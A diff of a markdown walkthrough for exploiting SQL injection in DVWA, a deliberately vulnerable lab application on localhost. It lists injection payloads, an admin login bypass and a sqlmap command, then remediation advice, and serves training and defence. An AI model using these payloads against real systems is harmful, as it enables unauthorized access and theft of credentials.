@@ -1,22 +1,22 @@
 `DVWA-SQLi-Walkthrough.md` – SQL injection test case with payloads and output
 
-### DVWA-SQLi-Walkthrough.md
+ DVWA-SQLi-Walkthrough.md
 ```markdown
 # 🔍 DVWA SQL Injection Walkthrough
 
-## 🔧 Environment
+ 🔧 Environment
 - **Application**: Damn Vulnerable Web Application (DVWA)
 - **Security Level**: Low
 - **Tool**: Burp Suite, Firefox, SQLMap (optional)
 
-## 🎯 Objective
+ 🎯 Objective
 Exploit SQL Injection in the login page and extract user credentials.
 
 ---
 
-## 🧪 Steps
+ 🧪 Steps
 
-### 1. Navigate to the SQL Injection module in DVWA:
+ 1. Navigate to the SQL Injection module in DVWA:
 ```
 http://localhost/dvwa/vulnerabilities/sqli/
 ```
@@ -28,7 +28,7 @@ Submit → Observe that all users are displayed — indicating **SQLi exists**.
 
 ---
 
-## 🧰 Useful Payloads
+ 🧰 Useful Payloads
 ```sql
 1' OR '1'='1 -- 
 1' OR '1'='1' #
@@ -39,7 +39,7 @@ admin' --
 
 ---
 
-## 🔐 Authentication Bypass Example
+🔐 Authentication Bypass Example
 Input in login:
 - Username: `admin' -- `
 - Password: `anything`
@@ -48,7 +48,7 @@ Login successful. This proves SQLi can bypass login authentication.
 
 ---
 
-## 🧪 Automate with SQLMap
+ 🧪 Automate with SQLMap
 ```bash
 sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xyz" --dbs
 ```
@@ -58,8 +58,8 @@ sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --coo
 
 ---
 
-## ✅ Remediation
+ ✅ Remediation
 - Use prepared statements (e.g., PDO in PHP)
 - Validate and sanitize inputs
 - Employ WAF and least-privilege database roles
-```
+  
